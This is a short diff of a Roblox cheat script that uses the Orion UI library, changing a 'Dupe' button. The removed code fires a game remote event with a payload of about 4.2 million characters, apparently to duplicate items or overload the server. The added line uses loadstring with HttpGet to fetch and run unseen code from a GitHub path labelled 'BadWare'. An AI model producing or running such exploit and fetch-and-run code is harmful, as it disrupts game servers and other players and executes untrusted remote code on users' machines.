@@ -59,7 +59,7 @@ Tab:AddButton({
 })
 
 Tab:AddButton({
-	Name = "Dupe ON",
+	Name = "New Dupe",
 	Callback = function()
 	OrionLib:MakeNotification({
 	Name = "Dupe Ativado.",
@@ -67,11 +67,7 @@ Tab:AddButton({
 	Image = "rbxassetid://4483345998",
 	Time = 5
 })
-    local args = {
-    [1] = "\0" .. string.rep("B", 4200000)
-}
-
-game:GetService("ReplicatedStorage"):WaitForChild("Remote"):WaitForChild("SetTutorialDone"):FireServer(unpack(args))
+loadstring(game:HttpGet("https://raw.githubusercontent.com/sandwichk/RobloxScripts/main/Scripts/BadWare/Dupe/AFSim", true))()
   	end    
 })
 
